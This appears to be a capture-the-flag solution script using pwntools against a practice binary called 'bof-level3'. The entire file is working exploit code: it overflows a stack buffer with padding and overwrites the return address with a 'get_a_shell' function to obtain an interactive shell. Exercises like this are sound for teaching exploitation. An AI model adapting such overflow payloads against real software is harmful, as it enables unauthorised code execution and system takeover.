#!/usr/bin/env python

from pwn import *

p = process('./bof-level3')
e = ELF('./bof-level3')

get_a_shell = e.symbols['get_a_shell']

buf = "1"*32 + "ABCDEFGHabcdefgh" + "BBBBCCCC" + p64(get_a_shell)

p.sendline(buf)

p.interactive()
